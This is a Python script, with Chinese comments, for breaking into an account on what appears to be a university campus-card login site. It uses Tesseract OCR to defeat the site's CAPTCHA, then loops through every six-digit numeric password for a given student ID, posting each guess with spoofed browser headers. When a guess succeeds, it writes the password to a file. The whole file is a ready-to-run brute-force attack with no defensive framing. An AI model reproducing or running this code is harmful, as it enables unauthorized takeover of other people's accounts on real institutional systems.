import requests
import base64
import json
import time
from PIL import Image
import pytesseract

# 这里填Tesseract-OCR目录把C:\\Program Files (x86)\\Tesseract-OCR改成你的路径
testdata_dir_config = '--tessdata-dir "C:\\Program Files (x86)\\Tesseract-OCR"'


session = requests.session()
login_url = 'http://*******/Login/LoginBySnoQuery'
index_url = 'http://*********/'
img_url = 'http://***********/Login/GetValidateCode?time=1541822935426'
user_url = 'http://***********/User/User'

def get_valicode():
    name = 'valicode.jpg'
    img = session.get(url=img_url)
    with open(name,'wb') as f:
        f.write(img.content)
    img = Image.open(name)
    # testdata_dir_config = '--tessdata-dir "C:\\Program Files (x86)\\Tesseract-OCR"'
    valicode = pytesseract.image_to_string(img, lang='amt', config=testdata_dir_config)
    return valicode

def login(password):
    data = {
        'sno': '*********',
        'pwd': base64.b64encode(str(password).encode('utf-8')).decode('utf-8'),
        'ValiCode': get_valicode(),
        'remember': '1',
        'uclass': '1s',
        'zqcode': '',
        'json': 'true',
    }
    header = {
        'Host': 'ykt.jsu.edu.cn',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://ykt.jsu.edu.cn/',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length':'81',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }
    IsSucceed = json.loads(session.post(url=login_url,data=data,headers = header).text)
    if IsSucceed['IsSucceed'] == True :
        print("登陆成功")
        return 1
    else :
        if IsSucceed['Msg'] == '验证码错误':
            print("验证码错误")
            return 0
        else:
            print(IsSucceed['Msg']+" 错误")
            # 账户密码错误
            return 2
def gvalicode(i):
    img = session.get(url=img_url)
    with open('img/'+i+'.jpg','wb') as f:
        f.write(img.content)

def run():
    start = time.time()
    for x in range(0, 999999):
        print(x)
        with open('已遍历.txt', 'a+') as f:
            f.write(str(x) + "\n")
        temp = 0
        while True:
            a = login(x)
            if a == 1:
                with open('password.txt', 'w') as f:
                    f.write(str(x))
                print("完成")
                temp = 1
                break
            elif a == 2:
                break
            else:
                continue
        if temp == 1:
            break
    end = time.time()
    print(end - start)

if __name__ == '__main__':

    run()
